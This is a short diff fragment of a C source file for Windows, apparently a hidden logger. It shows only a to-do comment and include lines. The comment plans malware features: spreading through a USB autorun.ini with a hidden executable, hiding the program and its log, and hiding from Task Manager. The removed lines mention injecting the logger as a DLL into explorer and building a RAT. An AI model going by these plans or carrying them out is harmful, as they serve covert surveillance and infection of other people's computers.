@@ -23,8 +23,6 @@
 *	()Check to see if USB is connected if so add autorun.ini and hide the exe on there
 *	(x)Make exe and log hidden
 *	()Hide from Task Manager
-*	(optional)Perhaps inject the logger as dll into explorer or something important
-*	(optional)create a RAT
 */
 #include <windows.h>
 #include <stdio.h>
